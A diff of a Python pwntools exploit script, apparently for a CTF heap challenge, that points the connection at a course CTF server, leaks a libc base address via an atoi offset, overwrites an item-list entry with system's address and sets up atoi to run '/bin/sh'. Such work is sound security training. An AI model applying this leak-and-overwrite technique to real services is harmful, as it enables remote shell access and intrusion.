@@ -1,8 +1,8 @@
 from pwn import *
 context.arch = 'amd64'
 
-#r = remote('csie.ctf.tw',10138)
-r = remote('localhost',8888)
+r = remote('csie.ctf.tw',10138)
+#r = remote('localhost',8888)
 
 #r.interactive()
 def add_item(size,name):
@@ -66,7 +66,8 @@ show()
 #leak libc base
 atoi_off = 0x36e80
 r.recvuntil('0 : ')
-libc = u64( r.recv(8)[:-2].ljust(8,'\x00') ) - atoi_off
+#libc = u64( r.recv(8)[:-2].ljust(8,'\x00') ) - atoi_off
+libc = u64( r.recv(8).ljust(8,'\x00') ) - atoi_off
 
 print 'libc base : %s' % hex(libc)
 
@@ -76,7 +77,7 @@ sys_addr = libc + sys_off
 
 #change itemlist[0]
 change(0,0x123, p64(sys_addr) )
-show()
+#show()
 
 
 #use atoi with user input /bin/sh
